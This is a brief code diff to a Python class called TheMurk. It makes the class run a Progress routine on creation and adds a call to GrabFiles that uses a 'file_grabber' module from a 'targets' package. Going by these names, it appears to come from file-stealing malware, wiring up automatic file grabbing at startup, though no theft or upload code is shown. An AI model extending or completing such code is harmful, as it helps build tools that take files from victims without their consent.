@@ -7,6 +7,7 @@ from targets.files.file_grabber import Grab
 class TheMurk:
     def __init__(self) -> None:
         self.MainVars()
+        self.Progress()
     
     def MainVars(self):
         self.name = ''
@@ -21,6 +22,7 @@ class TheMurk:
     
     def Progress(self):
         self.Start()
+        self.GrabFiles()
 
     def Start(self):
         if not config.debuging:
